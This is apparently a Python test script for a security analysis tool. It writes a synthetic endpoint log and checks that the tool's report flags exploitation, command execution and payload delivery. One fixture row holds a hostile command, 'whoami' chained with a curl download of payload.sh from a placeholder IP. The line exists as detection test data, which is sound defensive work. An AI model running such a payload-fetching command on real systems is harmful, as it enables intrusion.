from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]


def main() -> None:
    subprocess.run([sys.executable, "tests/make_demo_pcap.py"], cwd=PROJECT_ROOT, check=True)
    tmp = PROJECT_ROOT / "data" / "tmp"
    tmp.mkdir(parents=True, exist_ok=True)
    endpoint = tmp / "endpoint_multisource.csv"
    endpoint.write_text(
        "timestamp,host,process_name,command_line,dst_ip,dst_port\n"
        '2026-06-27T06:41:00Z,10.10.10.20,bash,"bash -c whoami; curl http://203.0.113.50/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
        encoding="utf-8",
    )

    result = subprocess.run(
        [
            sys.executable,
            "main.py",
            "--mode",
            "pcap",
            "--input",
            "data/pcap/demo_attack.pcap",
            "--demo-index",
            "--endpoint-log",
            str(endpoint.relative_to(PROJECT_ROOT)),
        ],
        cwd=PROJECT_ROOT,
        check=True,
        capture_output=True,
        text=True,
    )
    report_path = PROJECT_ROOT / json.loads(result.stdout)["report"]
    analysis = json.loads(report_path.with_suffix(".json").read_text(encoding="utf-8"))

    stages = {item["stage"] for item in analysis["attack_chain"]}
    assert "Exploitation" in stages
    assert "Command Execution" in stages
    assert "Payload Delivery" in stages
    assert analysis["impact_assessment"]["verdict"] == "Likely successful exploitation"
    assert analysis["impact_assessment"]["confidence"] == "high"
    evidence_ids = {item["evidence_id"] for item in analysis["agent_findings"]["evidence_pack"]}
    assert "endpoint1-1" in evidence_ids
    report = report_path.read_text(encoding="utf-8")
    assert "endpoint1-1" in report
    assert "Likely successful exploitation" in report


if __name__ == "__main__":
    main()
